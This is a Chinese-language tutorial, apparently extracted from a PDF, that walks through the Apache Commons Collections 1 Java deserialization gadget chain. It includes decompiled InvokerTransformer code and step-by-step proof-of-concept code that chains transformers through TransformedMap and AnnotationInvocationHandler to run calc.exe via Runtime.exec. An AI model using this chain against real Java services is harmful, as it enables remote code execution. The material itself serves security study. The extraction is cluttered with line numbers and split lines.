CommonCollection1
InvokeTransformer
//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
// 
package 
; 
import 
Serializable;
import 
InvocationTargetException;
import 
Method;
import 
FunctorException;
import 
Transformer; 
public class InvokerTransformer implements Transformer, Serializable { 
    static final long serialVersionUID = -8653385846894047688L; 
    private final String iMethodName; 
    private final Class[] iParamTypes; 
    private final Object[] iArgs; 
    public static Transformer getInstance(String methodName) { 
        if (methodName == null) { 
            throw new IllegalArgumentException("The method to invoke must not be null"); 
        } else { 
            return new InvokerTransformer(methodName); 
        } 
    } 
    public static Transformer getInstance(String methodName, Class[] paramTypes, Object[] a
rgs) { 
        if (methodName == null) { 
            throw new IllegalArgumentException("The method to invoke must not be null"); 
        } else if (paramTypes == null && args != null || paramTypes != null && args == null 
|| paramTypes != null && args != null && paramTypes.length != args.length) { 
            throw new IllegalArgumentException("The parameter types must match the argument
s"); 
        } else if (paramTypes != null && paramTypes.length != 0) { 
            paramTypes = (Class[])paramTypes.clone(); 
            args = (Object[])args.clone(); 
            return new InvokerTransformer(methodName, paramTypes, args); 
        } else { 
            return new InvokerTransformer(methodName); 
        } 
    } 
    private InvokerTransformer(String methodName) { 
        this.iMethodName = methodName; 
        this.iParamTypes = null; 
        this.iArgs = null; 
org.apache.commons.collections.functors
java.io.
java.lang.reflect.
java.lang.reflect.
org.apache.commons.collections.
org.apache.commons.collections.
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
这是一个单例模式设计的类，通过transform方法使用反射执行代码。传入参数为一个对象。
    } 
    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) { 
        this.iMethodName = methodName; 
        this.iParamTypes = paramTypes; 
        this.iArgs = args; 
    } 
    public Object transform(Object input) { 
        if (input == null) { 
            return null; 
        } else { 
            try { 
                Class cls = input.getClass(); 
                Method method = cls.getMethod(this.iMethodName, this.iParamTypes); 
                return method.invoke(input, this.iArgs); 
            } catch (NoSuchMethodException var5) { 
                throw new FunctorException("InvokerTransformer: The method '" + this.iMetho
dName + "' on '" + input.getClass() + "' does not exist"); 
            } catch (IllegalAccessException var6) { 
                throw new FunctorException("InvokerTransformer: The method '" + this.iMetho
dName + "' on '" + input.getClass() + "' cannot be accessed"); 
            } catch (InvocationTargetException var7) { 
                throw new FunctorException("InvokerTransformer: The method '" + this.iMetho
dName + "' on '" + input.getClass() + "' threw an exception", var7); 
            } 
        } 
    }
} 
、 
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
调用方式： 
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[]{S
tring.class},new Object[]{"calc.exe"}); 
        invokerTransformer.transform(Runtime.getRuntime());
1
2
3
之后尝试搜索有什么地方调用了invokeTransformer.transform方法，同搜索transform关键字，找到几处：
构造链中使用的是ChainedTransformer，这里的SwitchTransformer也有ChainedTransformer的特点，不过多追加了一个
判断。
通过ChainedTransformer调用InvokeTransformer执行命令：
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[]{S
tring.class},new Object[]{"calc.exe"}); 
       // invokerTransformer.transform(Runtime.getRuntime()); 
        Transformer[] transformers={ 
            new ConstantTransformer(Runtime.getRuntime()),//ConstantTransformer传进去一个对
象，然后通过transform返回传进去的对象。这样在chainedTransformer链中就不需要传入一个对象。 
            invokerTransformer};
//        Transformer[] transformers=new Transformer[]{
//            new ConstantTransformer(Runtime.getRuntime()),
//            new InvokerTransformer("exec", new Class[]{String.class},new Object[]{"calc.e
xe"}),
//        }; 
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); 
        chainedTransformer.transform(""); 
1
2
3
4
5
6
7
8
9
10
11
12
13
此处ConstantTransformer类的作用是自动返回一个对象。
TransformedMap
TransformedMap用于对Java标准数据结构Map做一个修饰，被修饰过的Map在添加新的元素时，将可以执行一个回调。我们通
过下面这行代码对innerMap进行修饰，传出的outerMap即是修饰后的Map：
通过static方法创建一个TransformedMap对象，其中，keyTransformer或者valueTransformer属性就是回调方法，之后调用p
ut方法存储数据，会进行数据整理，第71，72行就调用transformKey或transformValue方法，然后调用回调方法。
完整的代码：
public static void main(String[] args) throws Exception { 
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[]{S
tring.class},new Object[]{"calc.exe"}); 
       // invokerTransformer.transform(Runtime.getRuntime()); 
        Transformer[] transformers={ 
            new ConstantTransformer(Runtime.getRuntime()),//ConstantTransformer传进去一个对
象，然后通过transform返回传进去的对象。这样在chainedTransformer链中就不需要传入一个对象。 
1
2
3
4
5
6
到此触发代码执行的逻辑已经完全清楚了，我们的`demo`中核心部分就在向`outermap`中添加一个新的原素。
因此要找到一个`readObject`方法能够自动执行这个添加元素的操作，从而触发反序列化。
如何执行outerMap.put--AnnotationInvocationHandler
            invokerTransformer};
//        Transformer[] transformers=new Transformer[]{
//            new ConstantTransformer(Runtime.getRuntime()),
//            new InvokerTransformer("exec", new Class[]{String.class},new Object[]{"calc.e
xe"}),
//        }; 
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); 
        //chainedTransformer.transform(""); 
        //System.out.println(Runtime.getRuntime().getClass().getMethod("exec",String.clas
s).invoke(Runtime.getRuntime(),"calc.exe")); 
        //Runtime.getRuntime().exec() 
        Map innerMap=new HashMap(); 
        Map outerMap= TransformedMap.decorate(innerMap,null,chainedTransformer); 
        outerMap.put("test","xxx");  //调用的是TransformedMap类中的put方法。 
    }
7
8
9
10
11
12
13
14
15
16
17
18
19
public class CommonCollections3 { 
    public static void main(String[] args) throws Exception { 
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[]{S
tring.class},new Object[]{"calc.exe"}); 
       // invokerTransformer.transform(Runtime.getRuntime()); 
        Transformer[] transformers={ 
            new ConstantTransformer(Runtime.getRuntime()),//ConstantTransformer传进去一个对
象，然后通过transform返回传进去的对象。这样在chainedTransformer链中就不需要传入一个对象。 
            invokerTransformer};
//        Transformer[] transformers=new Transformer[]{
//            new ConstantTransformer(Runtime.getRuntime()),
//            new InvokerTransformer("exec", new Class[]{String.class},new Object[]{"calc.e
xe"}),
//        }; 
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); 
        //chainedTransformer.transform(""); 
        //System.out.println(Runtime.getRuntime().getClass().getMethod("exec",String.clas
s).invoke(Runtime.getRuntime(),"calc.exe")); 
        //Runtime.getRuntime().exec() 
        Map innerMap=new HashMap(); 
        Map outerMap= TransformedMap.decorate(innerMap,null,chainedTransformer); 
        outerMap.put("test","xxx");  //调用的是TransformedMap类中的put方法。 
        Class aClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandle
r"); 
        Constructor constructor = aClass.getDeclaredConstructor(Class.class, Map.class); 
        constructor.setAccessible(true); 
        Object obj = constructor.newInstance(Retention.class, outerMap); 
        ByteArrayOutputStream barr=new ByteArrayOutputStream(); 
        ObjectOutputStream oos=new ObjectOutputStream(barr); 
        oos.writeObject(obj); 
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
此处生成序列化流时会报一个错误：
因为Runtime类没有实现serializable接口，所以这里不能被反序列化。需要简单的修改上面的链：
Runtime类没有实现serializable接口不能反序列化，但是Class类实现了，所以我们在ConstantTransformer这里传入Runt
ime类的类对象，然后利用Class类对象当中的getMethod方法获取到getRuntime方法，之后调用java.lang.reflect.Method
类中的invoke方法执行getRuntime方法，返回一个Runtime对象;
        oos.close(); 
    }
}
28
29
30
public static void main(String[] args) throws Exception { 
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[]{S
tring.class},new Object[]{"calc.exe"}); 
       // invokerTransformer.transform(Runtime.getRuntime()); 
//        Transformer[] transformers={
//            new ConstantTransformer(Runtime.getRuntime()),//ConstantTransformer传进去一个
对象，然后通过transform返回传进去的对象。这样在chainedTransformer链中就不需要传入一个对象。
//            invokerTransformer}; //此处因为Runtime类没有实现serializable接口，所以无法被反序
列化，需要修改链。 
        Transformer[] transformers={ 
            new ConstantTransformer(Runtime.class), 
            new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new 
Object[]{"getRuntime",new Class[0]}),//通过InvokerTransformer方法获取getRuntime方法 
            new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Ob
ject[]{null,new Object[0]}),  //If the underlying method is static, then the specified obj
 argument is ignored. It may be null. 
            invokerTransformer, 
        }; 
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); 
        chainedTransformer.transform("");
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
package 
; 
import 
Method; 
public class calc { 
    public static void main(String[] args) throws Exception{ 
       // Runtime.getRuntime().exec("calc.exe"); 
reflect2
java.lang.reflect.
1
2
3
4
5
6
7
在执行上述修改后的代码，进行序列化时还是会爆出一个错误：
这个错误经过调试之后发现是因为执行InvokeTransformer的transform对象之后返回的对象类型为ProcessImpl，导致put方
法的value值为这个类，而这个类是没有实现接口无法被序列化的。
                try{ 
            Object runtime=Class.forName("java.lang.Runtime") 
                    .getMethod("getRuntime")   //此次是通过getRuntime方法返回一个runtime对象。
具体内容可见Runtim类 
                    .invoke(null); //此处getRuntime是一个静态方法，反射调用不需要传入对象  //If 
the underlying method is static, then the specified obj argument is ignored. It may be nul
l. 
            Class.forName("java.lang.Runtime") 
                    .getMethod("exec",String.class) 
                    .invoke(runtime,"calc.exe");// 
        }catch (Exception e){ 
            System.out.println(e); 
        } 
        try{ 
            Class runtime2=Runtime.class.getClass(); 
            Method method=runtime2.getMethod("getMethod",String.class,Class[].class); 
            System.out.println(method); 
            Method runtimeObj= (Method) method.invoke(Runtime.class,"getRuntime",new Class[
0]); 
            System.out.println(runtimeObj); 
            Object demo1=runtimeObj.invoke(null, new Object[0]); 
            System.out.println(demo1); 
            Class.forName("java.lang.Runtime") 
                    .getMethod("exec",String.class) 
                    .invoke(demo1,"calc.exe"); 
            //method.exec("calc.exe"); 
        }catch (Exception e){ 
            e.printStackTrace(); 
        } 
    } 
}
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32